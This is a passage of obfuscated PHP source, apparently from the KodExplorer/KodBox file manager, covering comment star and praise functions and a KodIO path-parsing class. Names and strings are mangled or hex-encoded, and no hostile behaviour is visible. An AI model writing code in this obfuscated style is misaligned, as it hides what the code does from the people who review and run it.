$ğûÄøıô = false) { $Ò°¿ÆŠ¥ =& $_SERVER[œ—üé‹ê]; if (!$ˆ­òº¶) { return array(); } if (is_string($ˆ­òº¶) || is_int($ˆ­òº¶)) { $ˆ­òº¶ = array($ˆ­òº¶); } $€Øâ»Â¡ = array($Ò°¿ÆŠ¥[589], $Ò°¿ÆŠ¥[2212] => $Ò°¿ÆŠ¥[585]); $Ôñöôİ– = array($Ò°¿ÆŠ¥[589] => array($Ò°¿ÆŠ¥[7], $ˆ­òº¶), $Ò°¿ÆŠ¥[188] => $ª ÅÄ); if ($ğûÄøıô) { $Ôñöôİ–[$Ò°¿ÆŠ¥[1589]] = $ğûÄøıô; } $çÃîº÷ = $this->field($€Øâ»Â¡)->where($Ôñöôİ–)->group($Ò°¿ÆŠ¥[589])->select(); return array_to_keyvalue($çÃîº÷, $Ò°¿ÆŠ¥[589], $Ò°¿ÆŠ¥[585]); } public function starTarget($Ö¬‡‰©, $–åÙÁ½Â) { $¶ßŒÑãà =& $_SERVER[œ—üé‹ê]; $óêÏİ¦Ø = $Ö¬‡‰© + self::TYPE_STAR_OFFSET; $‚Øüé¨Å = array($¶ßŒÑãà[1589] => USER_ID, $¶ßŒÑãà[188] => $óêÏİ¦Ø, $¶ßŒÑãà[589] => $–åÙÁ½Â); $¼—È´“€ = $this->where($‚Øüé¨Å)->find(); if ($¼—È´“€) { return $this->where(array($¶ßŒÑãà[487] => $¼—È´“€[$¶ßŒÑãà[487]]))->delete(); } $×‰§Íá€ = array($¶ßŒÑãà[2208] => 0, $¶ßŒÑãà[1589] => USER_ID, $¶ßŒÑãà[859] => 1, $¶ßŒÑãà[168] => $¶ßŒÑãà[12], $¶ßŒÑãà[188] => $óêÏİ¦Ø, $¶ßŒÑãà[589] => $–åÙÁ½Â, $¶ßŒÑãà[2211] => 0, $¶ßŒÑãà[2210] => 0); return $this->add($×‰§Íá€); } public function starTargetCount($ÙÍÇúô¬, $ˆ×¸€Ï“) { $ÓáØÉşÕ =& $_SERVER[œ—üé‹ê]; $ŸËğµÓû = $ˆ×¸€Ï“ + self::TYPE_STAR_OFFSET; $Ş»şà³ = $this->commentCount($ÙÍÇúô¬, $ŸËğµÓû); $µ½» Åî = $this->commentCount($ÙÍÇúô¬, $ŸËğµÓû, USER_ID); return array($ÓáØÉşÕ[2213] => $Ş»şà³, $ÓáØÉşÕ[2214] => $µ½» Åî); } public function starTargetUserList($ÜçËÚŠê, $ñëÂ”ú) { $ûš”Ôµå =& $_SERVER[œ—üé‹ê]; $ı¨ƒüå = $ÜçËÚŠê + self::TYPE_STAR_OFFSET; $Â‡§æÇß = array($ûš”Ôµå[589] => $ñëÂ”ú, $ûš”Ôµå[188] => $ı¨ƒüå); $‚Ç£‡Œ = $this->where($Â‡§æÇß)->count(); $ˆŞú ¦Õ = array($ûš”Ôµå[332] => $‚Ç£‡Œ, $ûš”Ôµå[2215] => array()); if (!$‚Ç£‡Œ) { return $ˆŞú ¦Õ; } $©—©¾›ù = $this->field($ûš”Ôµå[1589])->where($Â‡§æÇß)->limit(500)->select(); $©—©¾›ù = array_to_keyvalue($©—©¾›ù, $ûš”Ôµå[12], $ûš”Ôµå[1589]); $ˆŞú ¦Õ[$ûš”Ôµå[2215]] = Model($ûš”Ôµå[597])->userListInfo($©—©¾›ù); return $ˆŞú ¦Õ; } public function prasiseUserList($Ğ±íòİé) { $Ñøï˜†ñ =& $_SERVER[œ—üé‹ê]; $±Ë¡îÛÎ = array($Ñøï˜†ñ[2216] => $Ğ±íòİé); $ßİ»•»¨ = $this->where($±Ë¡îÛÎ)->find(); $ù‚°ø÷ = _get($ßİ»•»¨, $Ñøï˜†ñ[2211], 0); $‘ š“¶› = array($Ñøï˜†ñ[332] => $ù‚°ø÷, $Ñøï˜†ñ[2215] => array()); if (!$ù‚°ø÷) { return $‘ š“¶›; } $“¿ô¦ê = Model($Ñøï˜†ñ[2217])->field($Ñøï˜†ñ[1589])->where($±Ë¡îÛÎ)->limit(500)->select(); $“¿ô¦ê = array_to_keyvalue($“¿ô¦ê, $Ñøï˜†ñ[12], $Ñøï˜†ñ[1589]); $‘ š“¶›[$Ñøï˜†ñ[2215]] = Model($Ñøï˜†ñ[597])->userListInfo($“¿ô¦ê); return $‘ š“¶›; } public function remove($Úøï˜ö’) { $‹õ›€ôš =& $_SERVER[œ—üé‹ê]; $äÉÄõß = array($‹õ›€ôš[2209] => $Úøï˜ö’); $ÖÏƒ–Ò = $this->where($äÉÄõß)->find(); if ($ÖÏƒ–Ò[$‹õ›€ôš[2208]]) { $this->where(array($‹õ›€ôš[2209] => $ÖÏƒ–Ò[$‹õ›€ôš[2208]]))->setAdd($‹õ›€ôš[2210], -1); } return $this->removeArray($Úøï˜ö’); } public function edit($ŞÕÅÕ€é, $úâííˆ°) { $àéîüí’ =& $_SERVER[œ—üé‹ê]; $“ÄÁÚô = array($àéîüí’[2209] => $ŞÕÅÕ€é); return $this->where($“ÄÁÚô)->save(array($àéîüí’[2218] => $úâííˆ°)); } public function prasise($Í†Ğñ¬ì) { $§™¾­› =& $_SERVER[œ—üé‹ê]; $šß²ÉØ¦ = Model($§™¾­›[2219]); $øªºÃ± = array($§™¾­›[2209] => $Í†Ğñ¬ì, $§™¾­›[1965] => USER_ID); $ï‰ó¾Ìô = $šß²ÉØ¦->where($øªºÃ±)->find(); if (!$ï‰ó¾Ìô) { $šß²ÉØ¦->add($øªºÃ±); $¨ëß¾Ü = $this->where(array($§™¾­›[2209] => $Í†Ğñ¬ì))->setAdd($§™¾­›[2211], 1); } else { $šß²ÉØ¦->where($øªºÃ±)->delete(); $¨ëß¾Ü = $this->where(array($§™¾­›[2209] => $Í†Ğñ¬ì))->setAdd($§™¾­›[2211], -1); } return $¨ëß¾Ü; } public function targetInfo($¬ÆÈ¢ É, $ÈÌ§Ó˜É) { $ß–ÚİÚÅ =& $_SERVER[œ—üé‹ê]; $‡Îó¨¥‘ = array($ß–ÚİÚÅ[670] => $¬ÆÈ¢ É, $ß–ÚİÚÅ[671] => $ÈÌ§Ó˜É); $Óşá‡¥Œ = $this->where($‡Îó¨¥‘)->count(); $ĞËŒ¶Œ = "\x52\111\107\x48\124\40\112\x4f\111\116\x20{$this->tablePrefix}\x63\157\155\x6d\145\156\x74\137\160\x72\141\x69\163\x65\40\x73\x74\141\162\x20\x6f\156\40\143\x6f\x6d\x6d\x65\156\x74\x2e\143\x6f\155\x6d\x65\156\x74\111\x44\40\75\x20\x73\x74\x61\162\x2e\x63\x6f\x6d\x6d\x65\x6e\164\x49\x44"; $Ä¾˜¡ï = $this->alias($ß–ÚİÚÅ[429])->where($‡Îó¨¥‘)->join($ĞËŒ¶Œ, $ß–ÚİÚÅ[2220])->count(); $«ÕÓıû’ = array($ß–ÚİÚÅ[2221] => $Óşá‡¥Œ, $ß–ÚİÚÅ[2222] => $Ä¾˜¡ï); return $«ÕÓıû’; } public function listData($æÅš‚«ğ) { $á÷ù¨éÃ =& $_SERVER[œ—üé‹ê]; if (isset($æÅš‚«ğ[$á÷ù¨éÃ[2223]])) { if ($æÅš‚«ğ[$á÷ù¨éÃ[2223]]) { $æÅš‚«ğ[$á÷ù¨éÃ[2216]] = array($á÷ù¨éÃ[1181], intval($æÅš‚«ğ[$á÷ù¨éÃ[2223]])); } unset($æÅš‚«ğ[$á÷ù¨éÃ[2223]]); } if (isset($æÅš‚«ğ[$á÷ù¨éÃ[2224]])) { if ($æÅš‚«ğ[$á÷ù¨éÃ[2224]]) { $æÅš‚«ğ[$á÷ù¨éÃ[2216]] = array($á÷ù¨éÃ[1178], intval($æÅš‚«ğ[$á÷ù¨éÃ[2224]])); } unset($æÅš‚«ğ[$á÷ù¨éÃ[2224]]); } return $this->_listData($æÅš‚«ğ); } private function _listData($¯Èë±²È) { $Öû£÷› =& $_SERVER[œ—üé‹ê]; $÷ªš—Ù = $this->where($¯Èë±²È)->_makeOrder()->selectPage(100); $this->_listAppendParent($÷ªš—Ù[$Öû£÷›[446]]); $this->_listAppendUser($÷ªš—Ù[$Öû£÷›[446]]); $this->_listAppendMeta($÷ªš—Ù[$Öû£÷›[446]]); return $÷ªš—Ù; } private function _makeOrder() { $Œ—–†¯‰ =& $_SERVER[œ—üé‹ê]; $ïÛÊ÷Ç = array($Œ—–†¯‰[2211], $Œ—–†¯‰[2210], $Œ—–†¯‰[231]); $¨®Øø¤ü = Input::get($Œ—–†¯‰[544], $Œ—–†¯‰[7], $Œ—–†¯‰[512], $ïÛÊ÷Ç); $íä”¯ØÕ = Input::get($Œ—–†¯‰[545], $Œ—–†¯‰[7], $Œ—–†¯‰[1967], array($Œ—–†¯‰[2225], $Œ—–†¯‰[540])); $ÍÜÓ¤¯­ = $¨®Øø¤ü . $Œ—–†¯‰[53] . $íä”¯ØÕ; return $this->order($ÍÜÓ¤¯­); } private function _listAppendParent(&$ÌóåêÂ™) { $¶‹Îèï´ =& $_SERVER[œ—üé‹ê]; $©ë‚¸É® = array_unique(array_to_keyvalue($ÌóåêÂ™, $¶‹Îèï´[12], $¶‹Îèï´[2208])); $©ë‚¸É® = array_remove_value($©ë‚¸É®, $¶‹Îèï´[228]); if (!$©ë‚¸É®) { return; } $ôí‡øÂ’ = $this->where(array($¶‹Îèï´[2209] => array($¶‹Îèï´[7], $©ë‚¸É®)))->select(); $ôí‡øÂ’ = array_to_keyvalue($ôí‡øÂ’, $¶‹Îèï´[2216]); foreach ($ÌóåêÂ™ as &$úÚ¸Ç™ç) { if (isset($ôí‡øÂ’[$úÚ¸Ç™ç[$¶‹Îèï´[2208]]])) { $úÚ¸Ç™ç[$¶‹Îèï´[2226]] = $ôí‡øÂ’[$úÚ¸Ç™ç[$¶‹Îèï´[2208]]]; } } unset($úÚ¸Ç™ç); } private function _listAppendUser(&$ÄÄİÌ¥) { $¬…õ®Ë± =& $_SERVER[œ—üé‹ê]; $ïùí— = array_unique(array_to_keyvalue($ÄÄİÌ¥, $¬…õ®Ë±[12], $¬…õ®Ë±[1589])); $ïùí— = array_remove_value($ïùí—, $¬…õ®Ë±[228]); if (count($ïùí—) == 0) { return; } foreach ($ÄÄİÌ¥ as $â¤™±ºŠ) { if (isset($â¤™±ºŠ[$¬…õ®Ë±[2226]])) { $ïùí—[] = $â¤™±ºŠ[$¬…õ®Ë±[2226]][$¬…õ®Ë±[1589]]; } } $Ø€€§î = Model($¬…õ®Ë±[617])->userListInfo($ïùí—); foreach ($ÄÄİÌ¥ as &$â¤™±ºŠ) { $â¤™±ºŠ[$¬…õ®Ë±[684]] = $Ø€€§î[$â¤™±ºŠ[$¬…õ®Ë±[1589]]]; if (isset($â¤™±ºŠ[$¬…õ®Ë±[2226]])) { $â¤™±ºŠ[$¬…õ®Ë±[2226]][$¬…õ®Ë±[684]] = $Ø€€§î[$â¤™±ºŠ[$¬…õ®Ë±[2226]][$¬…õ®Ë±[1589]]]; } } unset($â¤™±ºŠ); } private function _listAppendMeta(&$™‘¬ÁĞ) { $ùµ€ÎÌ =& $_SERVER[œ—üé‹ê]; $›Ì¤ø›ƒ = array_unique(array_to_keyvalue($™‘¬ÁĞ, $ùµ€ÎÌ[12], $ùµ€ÎÌ[2216])); $›Ì¤ø›ƒ = array_remove_value($›Ì¤ø›ƒ, $ùµ€ÎÌ[228]); if (!$›Ì¤ø›ƒ) { return; } foreach ($™‘¬ÁĞ as $‰Û±“‚‡) { if (isset($‰Û±“‚‡[$ùµ€ÎÌ[2226]])) { $›Ì¤ø›ƒ[] = $‰Û±“‚‡[$ùµ€ÎÌ[2226]][$ùµ€ÎÌ[2216]]; } } $Á£Ó£«° = $this->metaList($›Ì¤ø›ƒ); if (!$Á£Ó£«°) { return !1; } foreach ($™‘¬ÁĞ as &$‰Û±“‚‡) { $‰Û±“‚‡[$ùµ€ÎÌ[555]] = $Á£Ó£«°[$‰Û±“‚‡[$ùµ€ÎÌ[2216]]]; if (isset($‰Û±“‚‡[$ùµ€ÎÌ[2226]])) { $‰Û±“‚‡[$ùµ€ÎÌ[2226]][$ùµ€ÎÌ[555]] = $Á£Ó£«°[$‰Û±“‚‡[$ùµ€ÎÌ[2226]][$ùµ€ÎÌ[2216]]]; } } unset($‰Û±“‚‡); } private function metaList($™™¼°îâ) { $—µ–³à =& $_SERVER[œ—üé‹ê]; if (!$™™¼°îâ) { return array(); } $€ÔÌ ‡÷ = array($—µ–³à[2216] => array($—µ–³à[7], $™™¼°îâ)); $­Ëğªï´ = Model($—µ–³à[2227])->where($€ÔÌ ‡÷)->select(); $­Ëğªï´ = array_to_keyvalue_group($­Ëğªï´, $—µ–³à[2216]); foreach ($­Ëğªï´ as $Áè‹ªË => $âÈŸŸ‚Ñ) { $ÂÛˆ­´– = array(); foreach ($âÈŸŸ‚Ñ as $ƒÉãæ‹Í) { $ÂÛˆ­´–[$ƒÉãæ‹Í[$—µ–³à[95]]] = $ƒÉãæ‹Í[$—µ–³à[451]]; } $­Ëğªï´[$Áè‹ªË] = $ÂÛˆ­´–; } return $­Ëğªï´ ? $­Ëğªï´ : array(); } public function removeTarget($ÖÙõã£, $½¶˜¸ª) { $±¾¦å‰ =& $_SERVER[œ—üé‹ê]; if (!$½¶˜¸ª) { return !0; } $½¶˜¸ª = is_array($½¶˜¸ª) ? $½¶˜¸ª : array($½¶˜¸ª); $™Áæ¶› = array($±¾¦å‰[188] => $ÖÙõã£, $±¾¦å‰[589] => array($±¾¦å‰[7], $½¶˜¸ª)); $Û¹ÀŒñŒ = $this->field($±¾¦å‰[2216])->where($™Áæ¶›)->select(); $’Æ€„…ã = array_to_keyvalue($Û¹ÀŒñŒ, $±¾¦å‰[12], $±¾¦å‰[2216]); return $this->removeArray($’Æ€„…ã); } public function removeArray($¼°–ûğ) { $ÜÈ“ü›ß =& $_SERVER[œ—üé‹ê]; if (!$¼°–ûğ) { return !0; } $¼°–ûğ = is_array($¼°–ûğ) ? $¼°–ûğ : array($¼°–ûğ); $€²¹ÈÒ“ = array($ÜÈ“ü›ß[2216] => array($ÜÈ“ü›ß[7], $¼°–ûğ)); Model($ÜÈ“ü›ß[2219])->where($€²¹ÈÒ“)->delete(); Model($ÜÈ“ü›ß[2228])->where($€²¹ÈÒ“)->delete(); return $this->where($€²¹ÈÒ“)->delete(); } } goto CÈÅİ§ÃÔ–; C©èİäÀ†ñ: class KodIO { const KOD_SOURCE = "\x7b\163\x6f\x75\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\145\162\122\x65\143\171\143\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\x65\x72\106\x61\166\175"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\162\x46\x69\x6c\145\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\x72\x46\x69\x6c\x65\x54\171\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\165\x70\x52\157\157\x74\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\x65\x72\123\x68\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\162\x53\150\141\x72\x65\114\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\162\145\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\162\x65\x49\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\173\163\150\x61\x72\145\111\164\145\155\x4c\x69\x6e\153\175"; const KOD_SHARE_OUTER = "\x7b\x73\150\141\x72\x65\111\164\145\155\117\x75\x74\175"; const KOD_SEARCH = "\173\163\x65\141\x72\143\150\x7d"; const KOD_BLOCK = "\173\142\154\157\x63\x6b\x7d"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\145\x72\x52\145\156\143\145\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\145\162\175"; public static function typeList() { $®çˆñ›ñ =& $_SERVER[œ—üé‹ê]; return array($®çˆñ›ñ[1435] => self::KOD_SOURCE, $®çˆñ›ñ[1436] => self::KOD_USER_RECYCLE, $®çˆñ›ñ[1437] => self::KOD_USER_FAV, $®çˆñ›ñ[1438] => self::KOD_USER_FILE_TAG, $®çˆñ›ñ[1439] => self::KOD_USER_FILE_TYPE, $®çˆñ›ñ[1440] => self::KOD_GROUP_ROOT_SELF, $®çˆñ›ñ[1441] => self::KOD_USER_SHARE, $®çˆñ›ñ[1442] => self::KOD_USER_SHARE_LINK, $®çˆñ›ñ[1443] => self::KOD_USER_SHARE_TO_ME, $®çˆñ›ñ[1444] => self::KOD_SHARE_ITEM, $®çˆñ›ñ[1445] => self::KOD_SHARE_LINK, $®çˆñ›ñ[1446] => self::KOD_SHARE_OUTER, $®çˆñ›ñ[1447] => self::KOD_SEARCH, $®çˆñ›ñ[1448] => self::KOD_BLOCK, $®çˆñ›ñ[1449] => self::KOD_IO, $®çˆñ›ñ[1450] => self::KOD_USER_RECENT, $®çˆñ›ñ[1451] => self::KOD_USER_DRIVER); } public static function parse($§ÊëÅÉË) { $ïÑ’–¡Õ =& $_SERVER[œ—üé‹ê]; $§ÊëÅÉË = self::clear($§ÊëÅÉË); $Ñ¯¦‘Ï = array_values(self::typeList()); preg_match($ïÑ’–¡Õ[1452], $§ÊëÅÉË, $ıñŒæø); $ğÃ’‹Ç¦ = array($ïÑ’–¡Õ[511] => !1, $ïÑ’–¡Õ[1453] => !1, $ïÑ’–¡Õ[508] => !1, $ïÑ’–¡Õ[87] => $§ÊëÅÉË, $ïÑ’–¡Õ[1353] => !1, $ïÑ’–¡Õ[1352] => $ïÑ’–¡Õ[12]); if (is_array($ıñŒæø) && count($ıñŒæø) == 5) { $ƒ²ÏÜ­¥ = $ïÑ’–¡Õ[1454] . $ıñŒæø[2] . $ïÑ’–¡Õ[402]; if (in_array($ƒ²ÏÜ­¥, $Ñ¯¦‘Ï)) { $ğÃ’‹Ç¦[$ïÑ’–¡Õ[1353]] = $ıñŒæø[1]; $ğÃ’‹Ç¦[$ïÑ’–¡Õ[33]] = $ƒ²ÏÜ­¥; $ğÃ’‹Ç¦[$ïÑ’–¡Õ[1455]] = substr($ƒ²ÏÜ­¥, 1, -1); $ğÃ’‹Ç¦[$ïÑ’–¡Õ[487]] = $ıñŒæø[3]; } $ğÃ’‹Ç¦[$ïÑ’–¡Õ[1352]] = $ıñŒæø[4]; } if ($ğÃ’‹Ç¦[$ïÑ’–¡Õ[511]] == self::KOD_SOURCE) { $ğÃ’‹Ç¦[$ïÑ’–¡Õ[487]] = intval($ğÃ’‹Ç¦[$ïÑ’–¡Õ[487]]); $ğÃ’‹Ç¦[$ïÑ’–¡Õ[1356]] = $ğÃ’‹Ç¦[$ïÑ’–¡Õ[487]]; } $¨»Í™± = array($ïÑ’–¡Õ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $ğÃ’‹Ç¦[$ïÑ’–¡Õ[1419]] = in_array($ğÃ’‹Ç¦[$ïÑ’–¡Õ[33]], $¨»Í™±); return $ğÃ’‹Ç¦; } public static function isTruePath($úïõˆÍ–) { $Èş ™ÖÎ =& $_SERVER[œ—üé‹ê]; if (substr($úïõˆÍ–, 0, 1) != $Èş ™ÖÎ[1454]) { return !0; } if (strpos($úïõˆÍ–, $Èş ™ÖÎ[498]) === 0) { return !0; } if (strpos($úïõˆÍ–, $Èş ™ÖÎ[1423]) === 0) { return !0; } if (strpos($úïõˆÍ–, $Èş ™ÖÎ[1456]) === 0) { return !0; } if (strpos($úïõˆÍ–, $Èş ™ÖÎ[1457]) === 0) { return !0; } if (strpos($úïõˆÍ–, $Èş ™ÖÎ[1458]) === 0) { return !0; } if (strpos($úïõˆÍ–, $Èş ™ÖÎ[1459]) === 0) { return !0; } return !1; } public static function clear($˜³Åñ»°) { $¬©¢¼ğ =& $_SERVER[œ—üé‹ê]; $˜³Åñ»° = str_replace(array($¬©¢¼ğ[1246], $¬©¢¼ğ[285]), $¬©¢¼ğ[53], $˜³Åñ»°); $˜³Åñ»° = str_replace($¬©¢¼ğ[97], $¬©¢¼ğ[8], $˜³Åñ»°); $”Âšç«ô = $¬©¢¼ğ[1460]; if (substr($˜³Åñ»°, 0, 3) == $¬©¢¼ğ[1461]) { $˜³Åñ»° = substr($˜³Åñ»°, 3); } while (strstr($˜³Åñ»°, $”Âšç«ô)) { $˜³Åñ»° = str_replace($”Âšç«ô, $¬©¢¼ğ[8], $˜³Åñ»°); } $˜³Åñ»° = preg_replace($¬©¢¼ğ[1462], $¬©¢¼ğ[8], $˜³Åñ»°); if ($˜³Åñ»° == $¬©¢¼ğ[8]) { return $¬©¢¼ğ[8]; } $˜³Åñ»° = rtrim($˜³Åñ»°, $¬©¢¼ğ[8]); return $˜³Åñ»°; } public static function pathTrue($¡Ã”¹³ç) { $Ã˜ò¡‡ú =& $_SERVER[œ—üé‹ê]; if (!$¡Ã”¹³ç) { return $Ã˜ò¡‡ú[12]; } $¡Ã”¹³ç = str_replace($Ã˜ò¡‡ú[254], $Ã˜ò¡‡ú[8], str_replace($Ã˜ò¡‡ú[1463], $Ã˜ò¡‡ú[8], $¡Ã”¹³ç)); $¡Ã”¹³ç = str_replace($Ã˜ò¡‡ú[254], $Ã˜ò¡‡ú[8], str_replace($Ã˜ò¡‡ú[1463], $Ã˜ò¡‡ú[8], $¡Ã”¹³ç)); if (!strstr($¡Ã”¹³ç, $Ã˜ò¡‡ú[1461])) { return $¡Ã”¹³ç; } $×ç©¡§Ë = explode($Ã˜ò¡‡ú[8], $¡Ã”¹³ç); foreach ($×ç©¡§Ë as $›¹•ğæ¯ => $ ˜–ù¥›) { if ($ ˜–ù¥› !== $Ã˜ò¡‡ú[1464]) { continue; } for ($Ù›ù“ë« = $›¹•ğæ¯; $Ù›ù“ë« >= 0; $Ù›ù“ë«--) { if ($×ç©¡§Ë[$Ù›ù“ë«] === $Ã˜ò¡‡ú[10] || $×ç©¡§Ë[$Ù›ù“ë«] === $Ã˜ò¡‡ú[1464] || $×ç©¡§Ë[$Ù›ù“ë«] === -1) { continue; } if ($×ç©¡§Ë[$Ù›ù“ë«] === $Ã˜ò¡‡ú[12]) { $×ç©¡§Ë[$›¹•ğæ¯] = -1; break; } $×ç©¡§Ë[$›¹•ğæ¯] = -1; $×ç©¡§Ë[$Ù›ù“ë«] = -1; break; } } $ßõÉİè€ = array(); foreach ($×ç©¡§Ë as $ ˜–ù¥›) { if ($ ˜–ù¥› !== -1) { $ßõÉİè€[] = $ ˜–ù¥›; } } $§Í£òàô = implode($Ã˜ò¡‡ú[8], $ßõÉİè€); if (strpos($§Í£òàô, $Ã˜ò¡‡ú[1465]) === 0) { $§Í£òàô = $Ã˜ò¡‡ú[1461] . substr($§Í£òàô, strlen($Ã˜ò¡‡ú[1465])); } return $§Í£òàô; } public static function pathUrlClear($Ò¶áé÷ô) { $õÊµîó® =& $_SERVER[œ—üé‹ê]; if (!$Ò¶áé÷ô) { return $Ò¶áé÷ô; } $Ò¶áé÷ô = rawurldecode($Ò¶áé÷ô); $Ò¶áé÷ô = str_replace($õÊµîó®[1463], $õÊµîó®[8], $Ò¶áé÷ô); if (strpos($Ò¶áé÷ô, $õÊµîó®[76]) > 0) { $Ò¶áé÷ô = substr($Ò¶áé÷ô, 0, strpos($Ò¶áé÷ô, $õÊµîó®[76])); } if (strpos($Ò¶áé÷ô, $õÊµîó®[1466]) > 0) { $Ò¶áé÷ô = substr($Ò¶áé÷ô, 0, strpos($Ò¶áé÷ô, $õÊµîó®[1466])); } return $Ò¶áé÷ô; } public static function sourceID($Å©ŞÏŸË) { $³ì¿‚ƒ =& $_SERVER[œ—üé‹ê]; $ÍÌ‰å“ = self::parse($Å©ŞÏŸË); if ($ÍÌ‰å“[$³ì¿‚ƒ[33]] !== self::KOD_SOURCE) { show_json(LNG($³ì¿‚ƒ[1467]), !1); } return $ÍÌ‰å“[$³ì¿‚ƒ[487]]; } public static function make($Â­©‡) { if (!$Â­©‡) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Â­©‡)); } public static function makeShare($í£à÷ŞÕ, $Ú·ËÆÑŒ) { return self::makePath(self::KOD_SHARE_ITEM, $í£à÷ŞÕ, $Ú·ËÆÑŒ); } public static function makeFileTypePath($Õ“ğ ¼×) { return self::makePath(self::KOD_USER_FILE_TYPE, $Õ“ğ ¼×); } public static function makeFileTagPath($ïç—¦) { return self::makePath(self::KOD_USER_FILE_TAG, $ïç—¦); } public static function makePath($ü÷¢œİÃ, $‹ğØíÇä = '', $›ªŸ¢è = '') { $®«ï¼†¶ =& $_SERVER[œ—üé‹ê]; $ÇëÖµ¹¬ = substr($ü÷¢œİÃ, 1, -1); $ù˜àÖ¥Ç = $®«ï¼†¶[1468] . $ÇëÖµ¹¬ . $®«ï¼†¶[1469] . $‹ğØíÇä . $®«ï¼†¶[1470]; $ù˜àÖ¥Ç = $›ªŸ¢è ? $ù˜àÖ¥Ç . $›ªŸ¢è . $®«ï¼†¶[8] : $ù˜àÖ¥Ç; return $ù˜àÖ¥Ç; } public static function hashPath($‹ÒÔ€ª, $ËÎì±Î = false) { $›¦ƒ‚ÙÌ =& $_SERVER[œ—üé‹ê]; if (!$‹ÒÔ€ª) { return $›¦ƒ‚ÙÌ[12]; } $ÅŸ¢Á¯ü = is_array($‹ÒÔ€ª) ? $‹ÒÔ€ª : IO::info($‹ÒÔ€ª); $üØ¬ä½• = _get($ÅŸ¢Á¯ü, $›¦ƒ‚ÙÌ[1471], $›¦ƒ‚ÙÌ[12]); if (!$üØ¬ä½• && isset($ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[557]])) { $üØ¬ä½• = $ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[557]]; } if (!$üØ¬ä½• && isset($ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[235]])) { $üØ¬ä½• = trim($ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[235]], $›¦ƒ‚ÙÌ[118]); } if ($üØ¬ä½•) { return $üØ¬ä½•; } if (!$üØ¬ä½• && isset($ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[191]]) && $ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[191]]) { $ÅŸ¢Á¯ü = IO::info(KodIO::make($ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[191]])); $üØ¬ä½• = _get($ÅŸ¢Á¯ü, $›¦ƒ‚ÙÌ[1471], $›¦ƒ‚ÙÌ[12]); if (!$üØ¬ä½• && isset($ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[557]])) { $üØ¬ä½• = $ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[557]]; } } $•İ¦‘Íõ = md5($ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[87]] . $ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[79]] . $ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[88]]); $°”È¦¿ = $•İ¦‘Íõ . $›¦ƒ‚ÙÌ[1472]; $üØ¬ä½• = $üØ¬ä½• ? $üØ¬ä½• : Cache::get($°”È¦¿); if (!$üØ¬ä½• && $ËÎì±Î) { $üØ¬ä½• = IO::hashSimple($ÅŸ¢Á¯ü[$›¦ƒ‚ÙÌ[87]]); Cache::set($°”È¦¿, $üØ¬ä½• ? $üØ¬ä½• : $•İ¦‘Íõ, 3600 * 24 * 30); } return $üØ¬ä½• ? $üØ¬ä½• : $•İ¦‘Íõ; } public static function hashPathSafe($¼õ¼Ú•À, $ŠİÕ«¨‘ = false) { $ÆÜµ¸°› =& $_SERVER[œ—üé‹ê]; $ƒ†Ÿ¯úÃ = self::hashPath($¼õ¼Ú•À, $ŠİÕ«¨‘); return md5($ƒ†Ÿ¯úÃ . $ÆÜµ¸°›[1473] . Model($ÆÜµ¸°›[882])->get($ÆÜµ¸°›[883])); } public static function initSystemPath() { $‚§Ã„ı‹ =& $_SERVER[œ—üé‹ê]; if (defined($‚§Ã„ı‹[1474])) { return; } define($‚§Ã„ı‹[1474], self::systemPath($‚§Ã„ı‹[189])); define($‚§Ã„ı‹[1475], self::systemPath($‚§Ã„ı‹[1476])); define($‚§Ã„ı‹[1477], self::systemPath($‚§Ã„ı‹[1478])); define($‚§Ã„ı‹[1479], self::systemPath($‚§Ã„ı‹[1480])); IOHistory::bindEvent(); } public static function systemPath($ ÉÅá¢) { $Ä£… ¾ò =& $_SERVER[œ—üé‹ê]; $„ìŠìûç = $Ä£… ¾ò[1481] . ucfirst($ ÉÅá¢); $°±Éó’è = Model($Ä£… ¾ò[882])->get($„ìŠìûç); if ($°±Éó’è) { return $°±Éó’è; } if ($ ÉÅá¢ == $Ä£… ¾ò[189]) { $°±Éó’è = self::make(Model($Ä£… ¾ò[942])->systemRootPathAdd($Ä£… ¾ò[628])); } else { $°±Éó’è = self::systemPath($Ä£… ¾ò[189]); $„·Üª´€ = self::sourceID($°±Éó’è); $°±Éó’è = self::make(Model($Ä£… ¾ò[942])->mkdir($„·Üª´€, $ ÉÅá¢)); } Model($Ä£… ¾ò[882])->set($„ìŠìûç, $°±Éó’è); return $°±Éó’è; } public static function systemFolder($õœ²¼òƒ) { $æÂÁ¾Ğ = IO_PATH_SYSTEM_SOURCE . $õœ²¼òƒ; $åÈ“ÚÏ = Cache::get($æÂÁ¾Ğ); if (!$åÈ“ÚÏ) { $ƒ¼—ªôí = IO::infoFullSimple($æÂÁ¾Ğ); if (!$ƒ¼—ªôí) { $åÈ“ÚÏ = IO::mkdir($æÂÁ¾Ğ, REPEAT_SKIP); } else { $åÈ“ÚÏ = 